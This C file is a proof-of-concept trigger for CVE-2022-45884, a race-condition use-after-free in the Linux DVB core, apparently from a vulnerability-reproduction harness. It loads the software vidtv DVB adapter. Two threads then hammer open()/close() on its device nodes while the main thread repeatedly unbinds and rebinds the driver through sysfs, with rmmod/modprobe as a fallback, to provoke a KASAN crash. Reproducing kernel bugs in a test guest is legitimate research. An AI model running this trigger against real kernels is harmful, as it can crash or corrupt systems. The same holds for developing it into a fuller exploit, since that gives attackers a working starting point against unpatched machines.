/*
 * CHAINFORGE KASAN crash-trigger for CVE-2022-45884 (CWE-362 race -> CWE-416 use-after-free).
 * dvb-core: dvb_register_device() kmemdup()s per-open fops; dvb_free_device() kfree()s them on
 * .disconnect(). Racing open() against device teardown reads the freed fops -> UAF. Reaches the
 * bug through the in-tree vidtv software DVB adapter (no hardware). KASAN splat = GOLD witness.
 *
 * Trigger: thread A tight-loops open()/close() on the vidtv demux node; the main thread unbinds/
 * removes vidtv so dvb_free_device() frees fops mid-open. No privesc; runs as root in the guest.
 */
#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* dvb device nodes vidtv creates under adapter0 */
static const char *NODES[] = {
    "/dev/dvb/adapter0/demux0",
    "/dev/dvb/adapter0/dvr0",
    "/dev/dvb/adapter0/frontend0",
    "/dev/dvb/adapter0/net0",
};

static volatile int stop_open = 0;

static void *opener(void *arg) {
    (void)arg;
    while (!stop_open) {
        for (unsigned i = 0; i < sizeof(NODES) / sizeof(NODES[0]); i++) {
            int fd = open(NODES[i], O_RDONLY | O_NONBLOCK);
            if (fd >= 0) close(fd);
        }
    }
    return NULL;
}

static int write_str(const char *path, const char *val) {
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    ssize_t n = write(fd, val, strlen(val));
    close(fd);
    return n < 0 ? -1 : 0;
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    /* vidtv registers a platform device on module load, creating the dvb nodes. Its unbind/
     * remove path calls dvb_free_device() -> kfree(fops). We repeatedly load then remove while
     * open() races the free. The bind/unbind sysfs path is the cleanest teardown trigger. */
    const char *BIND = "/sys/bus/platform/drivers/vidtv/bind";
    const char *UNBIND = "/sys/bus/platform/drivers/vidtv/unbind";
    const char *DEV = "vidtv.0";

    system("/bin/busybox modprobe vidtv 2>/dev/null || /bin/busybox insmod "
           "/lib/modules/vidtv.ko 2>/dev/null");
    /* give udev-less devtmpfs a moment to create nodes */
    for (int i = 0; i < 20; i++) {
        if (access(NODES[0], F_OK) == 0) break;
        usleep(100000);
    }
    if (access(NODES[0], F_OK) != 0)
        printf("[cf] warning: %s not present (vidtv load may have failed)\n", NODES[0]);

    pthread_t a, b;
    pthread_create(&a, NULL, opener, NULL);
    pthread_create(&b, NULL, opener, NULL);

    const int rounds = 3000;
    for (int i = 0; i < rounds; i++) {
        /* teardown (frees fops) then re-bind, racing the openers */
        if (write_str(UNBIND, DEV) != 0) {
            /* fall back to module remove/insert if driver bind path differs */
            system("/bin/busybox rmmod vidtv 2>/dev/null");
            system("/bin/busybox modprobe vidtv 2>/dev/null");
        } else {
            usleep(200);
            write_str(BIND, DEV);
        }
        if ((i & 0xff) == 0) printf("[cf] teardown round %d/%d\n", i, rounds);
    }
    stop_open = 1;
    pthread_join(a, NULL);
    pthread_join(b, NULL);
    printf("[cf] done %d rounds (no KASAN splat in this run)\n", rounds);
    return 0;
}
